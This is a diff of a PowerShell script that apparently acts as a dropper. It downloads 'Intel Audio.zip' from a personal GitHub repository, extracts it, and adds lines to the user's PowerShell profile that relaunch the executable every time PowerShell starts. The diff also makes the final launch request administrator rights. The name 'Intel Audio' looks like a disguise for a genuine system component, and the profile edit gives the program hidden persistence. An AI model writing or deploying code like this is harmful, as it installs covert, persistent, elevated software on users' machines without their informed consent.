@@ -30,10 +30,9 @@ if (-Not (Test-Path $TargetPath)) {
       Write-Output "Target folder created"
 }
 
-Invoke-WebRequest -Uri "https://github.com/silentoverride/test/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
-Write-Output "File downloaded"
-
 if (-Not (Test-Path $TargetFile)) {
+      Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/raw/refs/heads/main/dist/Intel Audio.zip" -OutFile $TargetZip
+      Write-Output "File downloaded"
       Expand-Archive -Path $TargetZip -DestinationPath $TargetPath
       Write-Output "File extracted"
       Remove-Item -Path $TargetZip
@@ -60,16 +59,19 @@ if (-Not (Test-Path $PowershellPath)) {
       New-Item -ItemType Directory -Force -Path $PowershellPath
       New-Item -ItemType File -Force -Path $PowershellFile
       Write-Output "Powershell profile created"
-      Set-Content -Path $PowershellFile -Value "if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile }"
+      Set-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile } }"
       Write-Output "Powershell profile updated"
 }
 if (Select-String -Path $PowershellFile "Start-Process") {
       Write-Output "Powershell profile already updated"
+      # exit 0
 } else {
-      Add-Content -Path $PowershellFile -Value "if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile }"
+      Add-Content -Path $PowershellFile -Value "if (Test-Path $TargetFile) { if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile } }"
       Write-Output "Powershell profile updated"
 }
 
-if (-Not (Get-Process -Name 'Intel Audio')) {
-      Start-Process $TargetFile
+if (Test-Path $TargetFile) {
+      if (-Not (Get-Process -Name 'Intel Audio')) {
+            Start-Process -FilePath $TargetFile -Verb RunAs
+      }
 }
